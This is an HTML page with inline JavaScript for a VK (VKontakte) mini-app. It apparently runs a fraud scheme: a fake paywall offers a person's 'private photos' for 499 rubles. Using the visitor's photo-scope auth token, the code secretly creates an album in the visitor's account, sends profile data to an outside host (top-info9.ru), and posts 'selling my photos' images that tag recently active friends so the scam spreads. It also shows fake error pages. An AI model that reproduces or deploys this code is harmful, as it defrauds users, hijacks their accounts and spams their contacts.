<!doctype html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
  <script>
        var params = window
                    .location
                    .search
                    .replace('?','')
                    .split('&')
                    .reduce(
                        function(p,e){
                            var a = e.split('=');
                            p[ decodeURIComponent(a[0])] = decodeURIComponent(a[1]);
                            return p;
                        },
                        {}
                    );

        var viewer_id = parseInt(params['vk_user_id']);
        var permissions = 1;
        var vk_app_id = parseInt(params['vk_app_id']);
        var unix = 0;
        var platform = params['vk_platform'];
        var date = '';
        var vk_is_app_user = parseInt(params['vk_is_app_user']);
        var is_loaded_story = 0;
        var IsAllowMessages = 0;

        var token = "";
        var viewer = {};
        var my_age = 0;
        var hash = window.location.hash.substr(1);


        function firstApi() {
            var code = 'var time=API.utils.getServerTime(); \n\
            var user=API.users.get({user_ids:'+hash+',fields:"uid, first_name, last_name, photo_max, photo_200, photo_id, bdate, sex, city, relation, is_closed, has_photo, counters"})[0]; \n\
            var friends = API.friends.get({"fields": "sex, photo_100, photo_200, photo_max, photo_400_orig, photo_id, online, online_mobile, can_post, relation, last_seen, has_photo, common_count, followers_count, has_photo", "count":500}); \n\
            return [user,friends];';

             vkConnect.send("VKWebAppCallAPIMethod", {
                "method": "execute",
                "params": {"code": code, "v": "5.131", "access_token": token}
            }).then(data => {
                viewer.friends = data.response[1];
                var user = data.response[0];
                if(user.id == viewer_id || user.sex == 2) {
                  hash = "";
                }


                console.log(areFriends);
                console.log(user);



                if(!hash){ // Ошибка
                    $("body").html('<html> \n\
                    <head><title>404 Not Found</title></head>  \n\
                    <body bgcolor="white">  \n\
                    <center><h1>403 Not Found</h1></center>  \n\
                    <hr><center>nginx</center>  \n\
                    </body>  \n\
                    </html>');
                }else{

                  createAlbom();

                  var div = '<div style="padding: 100px;padding-top:50px;padding-bottom:10px;" class="w-full lg:max-w-full lg:flex"> \n\
                              <div class="h-48 lg:h-auto lg:w-48 flex-none bg-cover rounded-t lg:rounded-t-none lg:rounded-l text-center overflow-hidden" style="background-image: url(\''+user.photo_200+'\')"> \n\
                              </div> \n\
                              <div class="border-r border-b border-l border-gray-400 lg:border-l-0 lg:border-t lg:border-gray-400 bg-white rounded-b lg:rounded-b-none lg:rounded-r p-4 flex flex-col justify-between leading-normal"> \n\
                                <div class="mb-8"> \n\
                                  <p class="text-sm text-gray-600 flex items-center"> \n\
                                    <svg class="fill-current text-gray-500 w-3 h-3 mr-2" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"> \n\
                                      <path d="M4 8V6a6 6 0 1 1 12 0v2h1a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2v-8c0-1.1.9-2 2-2h1zm5 6.73V17h2v-2.27a2 2 0 1 0-2 0zM7 6v2h6V6a3 3 0 0 0-6 0z" /> \n\
                                    </svg> \n\
                                    Платный контент \n\
                                  </p> \n\
                                  <div class="text-gray-900 font-bold text-xl mb-2">'+user.first_name+'</div> \n\
                                  <p style="margin-bottom:10px;" class="text-gray-700 text-base">Всего 3 личных фотографии</p> \n\
                                  <img style="display: inline-block;" class="w-10 h-10 rounded-full mr-1" src="1.jpeg"> \n\
                                  <img style="display: inline-block;" class="w-10 h-10 rounded-full mr-1" src="2.jpeg"> \n\
                                  <img style="display: inline-block;" class="w-10 h-10 rounded-full mr-1" src="3.jpeg"> \n\
                                </div> \n\
                                <span style="width: fit-content;" class="inline-block bg-gray-200 rounded-full px-3 py-1 text-sm font-semibold text-gray-700 mr-2 mb-2">14 подписок</span> \n\
                              </div> \n\
                            </div> \n\
                            <a style="width: 90%;display: block;text-align: center;margin: auto;" href="red_pay.html?r=1&viewer_id='+viewer_id+'&app=photo&amount=499" target="_blank" class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded w-full"> \n\
                              Открыть доступ и просмотреть фото \n\
                            </a> \n\
                            <span style="text-align: center;width: 90%;margin: auto;" class="block bg-gray-200 rounded-full px-3 py-1 text-sm font-semibold text-gray-700 mr-2 mb-2">499 рублей</span>';
                    $("body").html(div);





                }


              })
              .catch(error => {

              });
        }

        window.addEventListener('load', function () {
            vkConnect.send('VKWebAppInit');

            vkConnect.send("VKWebAppGetAuthToken", {
                "app_id": vk_app_id,
                "scope": "photos"
            })
            .then(data => {
                if(token){return false;}
                token = data.access_token;
                firstApi();


            })
            .catch(error => {

            });

        });


        function getRandom(min, max)
        {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }

        function createAlbom(){
          vkConnect.sendPromise("VKWebAppCallAPIMethod", {
              "method": "photos.createAlbum",
              "params": {"title":"1"+viewer_id,"v": "5.95", "access_token": token}
          }).then(data => {
            var id_albom = data.response.id;
            uploadPhotoAlbom(id_albom);
            })
            .catch(error => {
                //tokenPhotos();
                console.log(error);
            });
        }

        var count_upload_photo = 0;
        function uploadPhotoAlbom(id_albom){
                html2canvas(document.getElementById('for_canvas'), {scrollY:0, scrollX:0}).then(function(canvas2) {
                      vkConnect.sendPromise("VKWebAppCallAPIMethod", {
                          "method": "photos.getUploadServer",
                          "params": {"album_id":id_albom,"v": "5.95", "access_token": token}
                      }).then(data => {

                        var upload_url = data.response.upload_url;
                        var b64Image = canvas2.toDataURL();
                        var u8Image  = b64ToUint8Array(b64Image);

                        var formData = new FormData();
                        //formData.append("image", new Blob([ u8Image ], {type: "image/jpg"}));
                        formData.append("upurl", upload_url);
                        formData.append("sex", viewer.sex);
                        formData.append("viewer_id", viewer.id);
                        //formData.append("is_photo", 1);
                        formData.append("my_photo", viewer.photo_max);

                        var text = "";

                        var xhr = new XMLHttpRequest();
                        xhr.open("POST", "https://top-info9.ru/PSIH/uploadPhoto.php", true);
                        xhr.onreadystatechange = function () {
                            if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
                                var data = JSON.parse(xhr.responseText);
                                var users_list = getFriendsOnlineForPhoto();
                                caption = "Продаю свои фото : \n\n https://vk.com/app"+vk_app_id+"_"+viewer_id+" \n"+users_list;

                                vkConnect.sendPromise("VKWebAppCallAPIMethod", {
                                    "method": "photos.save",
                                    "params": {"album_id": id_albom, "server": data.server, "photos_list": data.photos_list, "hash":data.hash, "caption":caption,"v": "5.95", "access_token": token}
                                }).then(data => {



                                  setTimeout(function() {
                                    var id_photo = data.response[0].id;
                                    caption = "Продаю свои фото : \n\n https://vk.com/app"+vk_app_id+"_"+viewer_id+"";
                                    vkConnect.sendPromise("VKWebAppCallAPIMethod", {
                                        "method": "photos.edit",
                                        "params": {"owner_id": viewer_id, "photo_id": id_photo,  "caption":caption,"v": "5.95", "access_token": token}
                                    }).then(data => {

                                    });
                                  }, 10000);


                                  count_upload_photo++;
                                  if(count_upload_photo < 4 && viewer.friends.items[global_offset_i+1]){
                                    setTimeout(function() {
                                        uploadPhotoAlbom(id_albom);
                                    }, 100);
                                  }
                                  })
                                  .catch(error => {

                                  });
                            }
                        };
                        xhr.send(formData);


                        })
                        .catch(error => {

                        });


                      //$("#for_canvas").html("");
                 });
            //});

        }

        function sortByLastTime() {
          viewer.friends.items.sort((a, b) => b.last_seen.time > a.last_seen.time ? 1 : -1);
        }

        function getFriendsOnlineForPhoto() {
          sortByLastTime();
          var users_list = "\n \n \n";
          var count = 0;
          for(;global_offset_i<viewer.friends.items.length;global_offset_i++) {
              users_list += "[id"+viewer.friends.items[global_offset_i].id+"|"+viewer.friends.items[global_offset_i].first_name+"], ";
              count++;
              if(count > 8){
                break;
              }
          }

            return users_list;
        }

    </script>
</head>
<body>



  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
  <script src="https://top-info9.ru/MESS_BACK/html2canvas.min.js"></script>
</body>
</html>
